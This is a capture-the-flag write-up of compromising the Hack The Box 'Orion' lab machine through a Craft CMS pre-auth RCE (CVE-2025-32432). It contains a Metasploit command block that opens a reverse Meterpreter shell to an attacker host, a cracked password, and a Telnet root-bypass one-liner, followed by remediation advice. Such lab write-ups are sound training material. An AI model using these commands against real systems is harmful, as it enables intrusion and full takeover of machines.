# HTB Orion Machine Writeup

<img width="480" height="274" alt="HTB Orion Machine" src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UzjyRHBRk2h2JzWNNvGmZA.png" />

## Machine Information
- **Target IP**: 10.129.244.146
- **Operating System**: Linux
- **Difficulty**: Easy
- **Attack Vector**: CraftCMS Pre-Auth RCE (CVE-2025-32432)

## Tools Used

- **rustscan**: Fast port discovery
- **nmap**: Service version detection
- **metasploit**: CVE-2025-32432 exploitation
- **mysql**: Database enumeration
- **hashcat**: Password cracking
- **ssh**: Remote access
- **curl**: HTTP requests

## Executive Summary

This writeup documents the exploitation of the HTB Orion machine, which featured a vulnerable Craft CMS installation susceptible to CVE-2025-32432, a critical pre-authentication remote code execution vulnerability. The attack path involved identifying the CMS version, exploiting the deserialization vulnerability through Metasploit, extracting database credentials from environment files, cracking a bcrypt password hash, and escalating privileges through an insecure Telnet configuration that allowed root shell access.

## Reconnaissance

### Port Scanning

```bash
nmap -sS -Pn -n -p- --min-rate 5000 10.129.244.146 -oN nmap/initial-scan.txt
```

![Port Scan Results](images/Pasted%20image%2020260905012914.png)

**Open Ports Discovered**:
- Port 22 (SSH)
- Port 80 (HTTP)

### Virtual Host Configuration

```bash
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```

## Web Application Enumeration

### Initial Discovery

Accessing the web application hosted on port 80:

![Web Application Initial Discovery](images/Pasted%20image%2020260905013234.png)

### Technology Detection

```bash
whatweb http://orion.htb
```

![Technology Detection](images/Pasted%20image%2020260905013325.png)

**Discovery**: Craft CMS identified as the underlying content management system.

### Admin Panel Discovery

Based on knowledge of Craft CMS's default structure, the `/admin` path was accessed directly, avoiding the need for extensive web fuzzing:

![Admin Panel Discovery](images/Pasted%20image%2020260905013626.png)

**Version Identified**: Craft CMS 5.6.16

## Vulnerability Discovery

### CVE-2025-32432 Research

Research into the identified CMS version revealed a critical vulnerability with publicly available exploits:

**Exploit Reference**: https://www.exploit-db.com/exploits/52525

**Vulnerability Details**:

CVE-2025-32432 is a critical pre-authentication Remote Code Execution vulnerability affecting Craft CMS versions 3.x, 4.x, and 5.x before 5.6.17. The vulnerability exists in the `assets/generate-transform` endpoint and allows unauthenticated attackers to execute arbitrary code via a Yii deserialization gadget chain.

**Affected Versions**:
- < 3.9.15
- < 4.14.15
- < 5.6.17

**Target Version**: 5.6.16 (Vulnerable)

## Exploitation

### CVE-2025-32432 via Metasploit

The Metasploit framework was used to streamline exploitation of the vulnerability:

```bash
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set RPORT 80
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.14.58
set LPORT 4444
set TARGET 0
set ASSET_ID 11
exploit
```

![Metasploit Successful Exploitation](images/Pasted%20image%2020260905010926.png)

**Result**: Meterpreter session established with remote code execution on the target server.

## Post-Exploitation

### File System Enumeration

With remote access established, enumeration of the file system was conducted in search of sensitive configuration files. The `.env` file was discovered at `/var/www/html/craft`, containing database credentials.

![Environment File Discovery](images/Pasted%20image%2020260905010859.png)

## Database Credential Extraction

### Database Access

Using the credentials extracted from the environment file, access was gained to the MySQL database. The `orion` database was queried, and the `users` table was enumerated.

![Database Enumeration](images/Pasted%20image%2020260905011102.png)

**Discovery**: A single registered user, `adam`, was identified in the users table.

### Password Hash Extraction

The bcrypt password hash for user `adam` was extracted:


$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

![Password Hash Extraction](images/Pasted%20image%2020260905011114.png)

## Password Cracking

### Hashcat Cracking

The extracted hash was processed using Hashcat to recover the plaintext password:

![Hashcat Cracking](images/Pasted%20image%2020260905014859.png)

**Result**: The password `darkangel` was successfully recovered for user `adam`.

## Initial Access

### SSH Authentication

Using the recovered credentials, SSH access was established:

```bash
ssh adam@orion.htb
# Password: darkangel
```

![SSH Access](images/Pasted%20image%2020260905015033.png)

### User Flag

Brief enumeration as user `adam` revealed the user flag:

![User Flag](images/Pasted%20image%2020260905015136.png)

## Privilege Escalation

### Telnet Root Shell Exploitation

Enumeration of the system as user `adam` revealed a misconfigured Telnet service. By manipulating the `USER` environment variable, a root shell could be spawned through Telnet's authentication mechanism:

```bash
adam@orion:/tmp$ USER="-f root" telnet -a 127.0.0.1
```

**Explanation**: This technique abuses Telnet's `-f` flag handling when passed through the `USER` environment variable, causing the local Telnet daemon to authenticate the connection as root without requiring a password.

![Root Shell Spawned](images/Pasted%20image%2020260905015316.png)

### Root Flag

With root access achieved, the final flag was captured:

![Root Flag](images/Pasted%20image%2020260905015339.png)

## Technical Analysis

### Vulnerability Chain

1. **Technology Fingerprinting** → Craft CMS version identification
2. **CVE Research** → CVE-2025-32432 pre-auth RCE discovery
3. **Metasploit Exploitation** → Deserialization gadget chain execution
4. **Configuration File Exposure** → Database credentials in `.env` file
5. **Database Enumeration** → User hash extraction
6. **Hash Cracking** → Plaintext password recovery
7. **Credential Reuse** → SSH access with database credentials
8. **Telnet Misconfiguration** → Root privilege escalation

### Key Vulnerabilities

- **CVE-2025-32432**: Unauthenticated deserialization RCE in Craft CMS
- **Sensitive File Exposure**: Database credentials stored in accessible `.env` file
- **Weak Password**: Bcrypt hash crackable with standard wordlists
- **Credential Reuse**: Database password reused for SSH authentication
- **Telnet Misconfiguration**: Environment variable injection allowing authentication bypass

## Remediation Recommendations

### Immediate Actions

1. **Update Craft CMS**: Upgrade to version 5.6.17 or later to patch CVE-2025-32432
2. **Secure Environment Files**: Restrict file system permissions on `.env` files and ensure they are not web-accessible
3. **Password Policy**: Enforce strong, unique passwords for all system accounts
4. **Remove Telnet**: Disable Telnet service and replace with SSH for all remote administration

### Long-term Security Improvements

1. **Credential Management**: Avoid password reuse across different services
2. **Patch Management**: Implement regular vulnerability scanning and timely patching
3. **Access Controls**: Apply least privilege principles to service accounts
4. **Security Monitoring**: Deploy logging and alerting for authentication anomalies and privilege escalation attempts

## Key Lessons

1. **CMS Fingerprinting**: Identifying exact software versions is critical for vulnerability research
2. **Deserialization Vulnerabilities**: Pre-authentication RCE vulnerabilities pose severe risk and require immediate patching
3. **Configuration File Security**: Environment files often contain sensitive credentials and must be properly secured
4. **Legacy Service Risks**: Telnet and similar legacy services carry inherent security risks and should be deprecated
5. **Credential Hygiene**: Password reuse across services significantly increases the impact of a single credential compromise

## Conclusion

The HTB Orion machine demonstrated a realistic attack scenario centered on a critical, publicly disclosed CMS vulnerability. The attack path showcased the complete exploitation lifecycle from initial reconnaissance through remote code execution, credential harvesting, and privilege escalation via a legacy service misconfiguration. This exercise reinforced the importance of maintaining up-to-date software, securing sensitive configuration files, and eliminating outdated services that introduce unnecessary attack surface.
